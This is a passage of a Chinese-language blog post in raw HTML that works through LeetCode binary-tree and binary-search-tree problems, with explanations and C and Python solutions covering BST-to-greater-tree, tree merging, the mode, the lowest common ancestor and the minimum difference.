class="keyword">if</span> (!root) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> **<span class="title">q</span> = <span class="title">malloc</span>(<span class="title">sizeof</span>(<span class="title">struct</span> <span class="title">TreeNode</span> *) * 1001);</span></span><br><span class="line">    <span class="keyword">int</span> left = <span class="number">0</span>, right = <span class="number">0</span>;</span><br><span class="line">    q[right++] = root;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (left &lt; right) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">node</span> = <span class="title">q</span>[<span class="title">left</span>++];</span></span><br><span class="line">        <span class="keyword">if</span> (node-&gt;left) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (isLeafNode(node-&gt;left)) </span><br><span class="line">            &#123;</span><br><span class="line">                ans += node-&gt;left-&gt;val;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> </span><br><span class="line">            &#123;</span><br><span class="line">                q[right++] = node-&gt;left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (node-&gt;right) </span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!isLeafNode(node-&gt;right)) </span><br><span class="line">            &#123;</span><br><span class="line">                q[right++] = node-&gt;right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当然，这么做有一个缺点就是需要提前开辟较大的空间</p><p><img src="https://i.loli.net/2020/09/19/MSdXJub9jvfs6Ge.png" alt="image.png"></p><h2 id="0x03-把二叉搜索树转换为累加树"><a href="#0x03-把二叉搜索树转换为累加树" class="headerlink" title="0x03.把二叉搜索树转换为累加树"></a>0x03.<a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree/" target="_blank" rel="noopener">把二叉搜索树转换为累加树</a></h2><blockquote><p>给定一个二叉搜索树（Binary Search Tree），把它转换成为累加树（Greater Tree)，使得每个节点的值是原来的节点值加上所有大于它的节点值之和。</p><p>例如：</p><p>输入: 原始二叉搜索树:<br>              5<br>            /   <br>           2     13</p><p>输出: 转换为累加树:<br>             18<br>            /   <br>          20     13</p><p>注意：本题和 1038: <a href="https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/binary-search-tree-to-greater-sum-tree/</a> 相同</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/convert-bst-to-greater-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/convert-bst-to-greater-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：该题为2020.9.21的每日一题</p></blockquote><p><strong>二叉搜索树</strong>有一个特点就是<strong>结点左子树的结点都比该结点小，右子树的结点都比该结点大</strong>，因而叫二叉搜索树，可以用以大幅缩短搜索的时间</p><h3 id="解法：深度优先搜索-反序中序遍历"><a href="#解法：深度优先搜索-反序中序遍历" class="headerlink" title="解法：深度优先搜索 + 反序中序遍历"></a>解法：深度优先搜索 + 反序中序遍历</h3><p>由于二叉查找树的这个特性，我们考虑<strong>递归实现的深度优先搜索</strong>算法，通过<strong>反序中序遍历</strong>来实现，过程如下：</p><ul><li><strong>遍历右子树，将右子树结点值加到summary</strong></li><li><strong>将当前结点值加到summary</strong></li><li><strong>将当前结点值置为summary</strong></li><li><strong>遍历左子树</strong></li></ul><p>每个结点需要一个额外的栈空间，因而空间复杂度为<strong>O</strong>(<strong>N</strong>)；需要遍历每个结点一次，因而时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span> *sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;right,sum);</span><br><span class="line">    *sum+=root-&gt;val;</span><br><span class="line">    root-&gt;val=*sum;</span><br><span class="line">    dfs(root-&gt;left,sum);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">convertBST</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    dfs(root, &amp;sum);</span><br><span class="line">    <span class="keyword">return</span> root;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/21/hJQADZUcMlypLYn.png" alt="image.png"></p><h2 id="0x04-合并二叉树"><a href="#0x04-合并二叉树" class="headerlink" title="0x04. 合并二叉树"></a>0x04. <a href="https://leetcode-cn.com/problems/merge-two-binary-trees/" target="_blank" rel="noopener">合并二叉树</a></h2><blockquote><p>给定两个二叉树，想象当你将它们中的一个覆盖到另一个上时，两个二叉树的一些节点便会重叠。</p><p>你需要将他们合并为一个新的二叉树。合并的规则是如果两个节点重叠，那么将他们的值相加作为节点合并后的新值，否则不为 NULL 的节点将直接作为新二叉树的节点。</p><p>示例 1:</p><p>输入:<br>    Tree 1                     Tree 2<br>          1                         2<br>         / \                       / \<br>        3   2                     1   3<br>       /                             \   \<br>      5                             4   7<br>输出:<br>合并后的树:<br>         3<br>        / \<br>       4   5<br>      / \   \<br>     5   4   7<br>注意: 合并必须从两个树的根节点开始。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/merge-two-binary-trees" target="_blank" rel="noopener">https://leetcode-cn.com/problems/merge-two-binary-trees</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：本题为2020.9.23的每日一题</p></blockquote><h3 id="解法：递归-深度优先搜索（DFS）"><a href="#解法：递归-深度优先搜索（DFS）" class="headerlink" title="解法：递归 + 深度优先搜索（DFS）"></a>解法：递归 + 深度优先搜索（DFS）</h3><p>逐层递归，合并到t1上：</p><ul><li><strong>t1、t2若为空则直接返回其中非空的那一个</strong></li><li><strong>将t2的val加到t1的val上</strong></li><li><strong>合并t1左与t2左</strong></li><li><strong>合并t1右与t2右</strong></li></ul><p>得到代码如下：</p><h3 id="时间复杂度："><a href="#时间复杂度：" class="headerlink" title="时间复杂度："></a>时间复杂度：</h3><p>搜索的次数和结点数量线性增长，故时间复杂度为<strong>O</strong>(<strong>N</strong>)</p><h3 id="空间复杂度："><a href="#空间复杂度：" class="headerlink" title="空间复杂度："></a>空间复杂度：</h3><p>需要的栈空间数量和结点数量线性增长，故空间复杂度为<strong>O</strong>(<strong>N</strong>)</p><h3 id="C语言版："><a href="#C语言版：" class="headerlink" title="C语言版："></a>C语言版：</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">mergeTrees</span><span class="params">(struct TreeNode* t1, struct TreeNode* t2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!t1)</span><br><span class="line">        <span class="keyword">return</span> t2;</span><br><span class="line">    <span class="keyword">if</span>(!t2)</span><br><span class="line">        <span class="keyword">return</span> t1;</span><br><span class="line">    t1-&gt;val += t2-&gt;val;</span><br><span class="line">    t1-&gt;left = mergeTrees(t1-&gt;left,t2-&gt;left);</span><br><span class="line">    t1-&gt;right = mergeTrees(t1-&gt;right,t2-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> t1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXgivj.png" alt="wXgivj.png"></p><h3 id="Python语言版："><a href="#Python语言版：" class="headerlink" title="Python语言版："></a>Python语言版：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"># class TreeNode:</span></span><br><span class="line"><span class="comment">#     def __init__(self, x):</span></span><br><span class="line"><span class="comment">#         self.val = x</span></span><br><span class="line"><span class="comment">#         self.left = None</span></span><br><span class="line"><span class="comment">#         self.right = None</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeTrees</span><span class="params">(self, t1: TreeNode, t2: TreeNode)</span> -&gt; TreeNode:</span></span><br><span class="line">        <span class="keyword">if</span> t1 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> t2</span><br><span class="line">        <span class="keyword">if</span> t2 == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> t1</span><br><span class="line">        t1.val += t2.val</span><br><span class="line">        t1.left = self.mergeTrees(t1.left, t2.left)</span><br><span class="line">        t1.right = self.mergeTrees(t1.right, t2.right)</span><br><span class="line">        <span class="keyword">return</span> t1</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/23/wXgJVx.png" alt="wXgJVx.png"></p><h2 id="0x05-二叉搜索树中的众数"><a href="#0x05-二叉搜索树中的众数" class="headerlink" title="0x05.二叉搜索树中的众数"></a>0x05.<a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree/" target="_blank" rel="noopener">二叉搜索树中的众数</a></h2><blockquote><p>给定一个有相同值的二叉搜索树（BST），找出 BST 中的所有众数（出现频率最高的元素）。</p><p>假定 BST 有如下定义：</p><p>结点左子树中所含结点的值小于等于当前结点的值<br>结点右子树中所含结点的值大于等于当前结点的值<br>左子树和右子树都是二叉搜索树<br>例如：<br>给定 BST [1,null,2,2],</p><p>1<br> \<br>  2<br> /<br>2<br>返回[2].</p><p>提示：如果众数超过1个，不需考虑输出顺序</p><p>进阶：你可以不使用额外的空间吗？（假设由递归产生的隐式调用栈的开销不被计算在内）</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/find-mode-in-binary-search-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/find-mode-in-binary-search-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法：递归-深度优先搜索（DFS）-1"><a href="#解法：递归-深度优先搜索（DFS）-1" class="headerlink" title="解法：递归 + 深度优先搜索（DFS）"></a>解法：递归 + 深度优先搜索（DFS）</h3><p>考虑到二叉搜索树中<strong>左子树所有结点的值小于当前结点值小于右子树所有结点的值</strong>，故还是采取<strong>深度优先搜索算法</strong></p><p>递归中序遍历，由于二叉搜索树的特殊性质，我们遍历的顺序一定是<strong>排序好的</strong></p><p>故构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">max</span>;<span class="comment">//数量最多的数的数量</span></span><br><span class="line"><span class="keyword">int</span> num;<span class="comment">//前一结点的连续结点个数</span></span><br><span class="line"><span class="keyword">int</span> pre;<span class="comment">//前一结点的值</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">size</span>;<span class="comment">//返回的数组的大小</span></span><br><span class="line"><span class="keyword">int</span> *retn;<span class="comment">//返回的数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span>* <span class="title">findMode</span><span class="params">(struct TreeNode* root, <span class="keyword">int</span>* returnSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    retn = (<span class="keyword">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>)*<span class="number">2150</span>);<span class="comment">//这是多次尝试后得出来的一个大概的边界值233333</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">    &#123;</span><br><span class="line">        *returnSize = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> retn;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">max</span> = <span class="number">0</span>;</span><br><span class="line">    pre = <span class="number">0xdeadbeef</span>;</span><br><span class="line">    <span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">    num = <span class="number">0</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    *returnSize = <span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">return</span> retn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode * root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;val == pre)</span><br><span class="line">        num++;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//新序列</span></span><br><span class="line">        num = <span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(num &gt; <span class="built_in">max</span>)<span class="comment">//相同结点数量比max还多，则进行重置</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">size</span> = <span class="number">0</span>;</span><br><span class="line">        retn[<span class="built_in">size</span>++] = root-&gt;val;</span><br><span class="line">        <span class="built_in">max</span> = num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(num == <span class="built_in">max</span>)<span class="comment">//否则，放入数组中</span></span><br><span class="line">    &#123;</span><br><span class="line">        retn[<span class="built_in">size</span>++] = root-&gt;val;        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pre = root-&gt;val;<span class="comment">//储存该结点值，继续遍历下一结点</span></span><br><span class="line"></span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/09/24/wxTxSA.png" alt="wxTxSA.png"></p><h2 id="0x06-二叉搜索树的最近公共祖先"><a href="#0x06-二叉搜索树的最近公共祖先" class="headerlink" title="0x06.二叉搜索树的最近公共祖先"></a>0x06.<a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree/" target="_blank" rel="noopener">二叉搜索树的最近公共祖先</a></h2><blockquote><p>给定一个二叉搜索树, 找到该树中两个指定节点的最近公共祖先。</p><p>百度百科中最近公共祖先的定义为：“对于有根树 T 的两个结点 p、q，最近公共祖先表示为一个结点 x，满足 x 是 p、q 的祖先且 x 的深度尽可能大（一个节点也可以是它自己的祖先）。”</p><p>例如，给定如下二叉搜索树:  root = [6,2,8,0,4,7,9,null,null,3,5]</p><p>示例 1:</p><p>输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 8<br>输出: 6<br>解释: 节点 2 和节点 8 的最近公共祖先是 6。<br>示例 2:</p><p>输入: root = [6,2,8,0,4,7,9,null,null,3,5], p = 2, q = 4<br>输出: 2<br>解释: 节点 2 和节点 4 的最近公共祖先是 2, 因为根据定义最近公共祖先节点可以为节点本身。</p><p>说明:</p><p>所有节点的值都是唯一的。<br>p、q 为不同节点且均存在于给定的二叉搜索树中。</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree" target="_blank" rel="noopener">https://leetcode-cn.com/problems/lowest-common-ancestor-of-a-binary-search-tree</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><blockquote><p>注：该题为2020.9.27的每日一题</p></blockquote><h4 id="解法：深度优先搜索（DFS）"><a href="#解法：深度优先搜索（DFS）" class="headerlink" title="解法：深度优先搜索（DFS）"></a>解法：深度优先搜索（DFS）</h4><p>二叉搜索树（BST）有一个很重要的性质就是<strong>左子树所有结点都小于当前节点，右子树所有结点都大于当前结点</strong>，所以我们可以直接通过比较结点的值来进行判断</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="function">struct TreeNode* <span class="title">lowestCommonAncestor</span><span class="params">(struct TreeNode* root, struct TreeNode* p, struct TreeNode* q)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(p == q)</span><br><span class="line">        <span class="keyword">return</span> p;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">bool</span> flag1 = p-&gt;val &gt; root-&gt;val;</span><br><span class="line">    <span class="keyword">bool</span> flag2 = q-&gt;val &gt; root-&gt;val;</span><br><span class="line">    <span class="keyword">if</span>(flag1 != flag2)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(p == root || q == root)</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(flag1)</span><br><span class="line">        <span class="keyword">return</span> lowestCommonAncestor(root-&gt;right,p,q);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lowestCommonAncestor(root-&gt;left,p,q);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/27/1sudkorBnCPqV5l.png" alt="@_I_39NAGH0__CROGOJD4XX.png"></p><h2 id="0x07-二叉搜索树的最小绝对差"><a href="#0x07-二叉搜索树的最小绝对差" class="headerlink" title="0x07 - 二叉搜索树的最小绝对差"></a>0x07 - <a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/" target="_blank" rel="noopener">二叉搜索树的最小绝对差</a></h2><blockquote><p>给你一棵所有节点为非负值的二叉搜索树，请你计算树中任意两节点的差的绝对值的最小值。</p><p>示例：</p><p>输入：</p><p>   1<br>    <br>     3<br>    /<br>   2</p><p>输出：<br>1</p><p>解释：<br>最小绝对差为 1，其中 2 和 1 的差的绝对值为 1（或者 2 和 3）。</p><p>提示：</p><p>树中至少有 2 个节点。<br>本题与 783 <a href="https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/</a> 相同</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><h3 id="解法：深度优先搜索-中序遍历"><a href="#解法：深度优先搜索-中序遍历" class="headerlink" title="解法：深度优先搜索 + 中序遍历"></a>解法：深度优先搜索 + 中序遍历</h3><p>因为是二叉搜索树，所以当进行中序遍历时肯定会按照从小到大的结点进行遍历</p><p>最小绝对差肯定出现在相邻值结点中，这里就不再过多赘叙了</p><p>构造代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0xffff</span>;</span><br><span class="line"><span class="keyword">int</span> pre = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    dfs(root-&gt;left);</span><br><span class="line">    <span class="keyword">if</span>(pre == <span class="number">-1</span>)</span><br><span class="line">        pre = root-&gt;val;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        ans = (root-&gt;val - pre) &lt; ans ? (root-&gt;val - pre) : ans;</span><br><span class="line">        pre = root-&gt;val;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(root-&gt;right);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getMinimumDifference</span><span class="params">(struct TreeNode* root)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    pre = <span class="number">-1</span>;</span><br><span class="line">    ans = <span class="number">0xffff</span>;</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/10/12/EUzkxuqK2ja4cFl.png" alt="image.png"></p><h2 id="0x08-二叉搜索树节点最小距离"><a href="#0x08-二叉搜索树节点最小距离" class="headerlink" title="0x08 - 二叉搜索树节点最小距离"></a>0x08 - <a href="https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes/" target="_blank" rel="noopener">二叉搜索树节点最小距离</a></h2><blockquote><p>给定一个二叉搜索树的根节点 root，返回树中任意两节点的差的最小值。</p><p>示例：</p><p>输入: root = [4,2,6,1,3,null,null]<br>输出: 1<br>解释:<br>注意，root是树节点对象(TreeNode object)，而不是数组。</p><p>给定的树 [4,2,6,1,3,null,null] 可表示为下图:</p><pre><code>      4    /   \  2      6 / \    1   3  </code></pre><p>最小的差值是 1, 它是节点1和节点2的差值, 也是节点3和节点2的差值。</p><p>注意：</p><p>二叉树的大小范围在 2 到 100。<br>二叉树总是有效的，每个节点的值都是整数，且不重复。<br>本题与 530：<a href="https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-absolute-difference-in-bst/</a> 相同</p><p>来源：力扣（LeetCode）<br>链接：<a href="https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes" target="_blank" rel="noopener">https://leetcode-cn.com/problems/minimum-distance-between-bst-nodes</a><br>著作权归领扣网络所有。商业转载请联系官方授权，非商业转载请注明出处。</p></blockquote><p>和上一题一样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span 